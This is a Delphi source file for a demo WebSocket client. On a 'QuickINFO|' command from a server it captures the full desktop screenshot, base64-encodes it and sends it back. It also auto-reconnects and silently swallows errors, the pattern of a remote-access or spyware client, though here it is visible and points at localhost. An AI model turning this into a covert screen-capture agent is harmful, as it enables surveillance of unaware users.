unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, sbxcore, sbxtypes, sbxwebsocketclient,
  Vcl.TMSFNCWebSocketCommon, Vcl.TMSFNCCustomComponent,
  Vcl.TMSFNCWebSocketClient, Vcl.StdCtrls, pngimage, netencoding, Vcl.ExtCtrls;

type
  TForm1 = class(TForm)
    ClientSocket: TTMSFNCWebsocketClient;
    Button1: TButton;
    Edit1: TEdit;
    pingtimer: TTimer;
    Connectiontimer: TTimer;
    procedure ClientSocketConnect(Sender: TObject;
      AConnection: TTMSFNCWebSocketConnection);
    procedure Button1Click(Sender: TObject);
    procedure pingtimerTimer(Sender: TObject);
    procedure ConnectiontimerTimer(Sender: TObject);
    procedure ClientSocketMessageReceived(Sender: TObject;
      AConnection: TTMSFNCWebSocketConnection; const aMessage: string);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

function CaptureScreen: TBitmap;
var
  DesktopDC: HDC;
begin
  Result := TBitmap.Create;
  try
    Result.SetSize(Screen.Width, Screen.Height);
    DesktopDC := GetDC(0);
    try
      Result.Canvas.Lock;
      try
        BitBlt(Result.Canvas.Handle, 0, 0, Screen.Width, Screen.Height,
          DesktopDC, 0, 0, SRCCOPY);
      finally
        Result.Canvas.Unlock;
      end;
    finally
      ReleaseDC(0, DesktopDC);
    end;
  except
    Result.Free;
    raise;
  end;
end;

function PNGImageToBytes(pngimage: TPngImage): TBytes;
var
  Stream: TMemoryStream;
begin
  Stream := TMemoryStream.Create;
  try
    pngimage.SaveToStream(Stream);
    SetLength(Result, Stream.Size);
    Stream.Position := 0;
    Stream.Read(Result[0], Stream.Size);
  finally
    Stream.Free;
  end;
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
  // setup client socket to connect to remote host on remote port!
  try
    self.ClientSocket.Port := 3434;
    self.ClientSocket.HostName := '127.0.0.1';
    self.ClientSocket.Connect;
  except
    on E: Exception do
    begin
      // show nothing here...
    end;
  end;
end;

procedure TForm1.ClientSocketConnect(Sender: TObject;
  AConnection: TTMSFNCWebSocketConnection);
begin
  self.Edit1.Enabled := false;
  self.Button1.Enabled := false;
  self.Button1.Caption := 'Connected!';
  AConnection.SendBytes(bytesof('NewCon|' + self.Edit1.text));
  self.pingtimer.Enabled := true;
  self.Connectiontimer.Enabled := false;
end;

procedure TForm1.ClientSocketMessageReceived(Sender: TObject;
  AConnection: TTMSFNCWebSocketConnection; const aMessage: string);
var
  ScreenShot: TBitmap;
  pngimage: TPngImage;
  BytesToSend: TBytes;
  ImageData: string;
begin
//show any message recieved in the forms caption...
self.Caption:=aMessage;
//This is just to show you what can be done with this....


//Here is an example of recieving some type of command... be better if you used Tstringlist and parced commands out fyi ;)
  if aMessage = 'QuickINFO|' then
  begin
    ScreenShot := CaptureScreen;
    try
      pngimage := TPngImage.Create;
      try
        pngimage.Assign(ScreenShot);

        // Convert PNG image to bytes
        BytesToSend := PNGImageToBytes(pngimage);

        // Encode bytes as base64 string
        ImageData := 'image|' + TNetEncoding.Base64.EncodeBytesToString
          (BytesToSend);

        // Send image data to the server
        AConnection.SendBytes(bytesof(ImageData));
        AConnection.SendBytes(bytesof('PCINFO|system info'));
        AConnection.SendBytes(bytesof('PCINFO|system info'));
        AConnection.SendBytes(bytesof('PCINFO|system info'));
      finally
        pngimage.Free;
      end;
    finally
      ScreenShot.Free;
    end;
    Exit;
  end;
end;

procedure TForm1.ConnectiontimerTimer(Sender: TObject);
begin
  try
    self.ClientSocket.Connect;
  except
    on E: Exception do
    begin
      // nothing...
    end;
  end;
end;

procedure TForm1.pingtimerTimer(Sender: TObject);
begin
  try
    self.ClientSocket.Ping('ping');
  except
    on E: Exception do
    begin
      self.ClientSocket.Disconnect(false);
      self.Connectiontimer.Enabled := true;
    end;
  end;
end;

end.
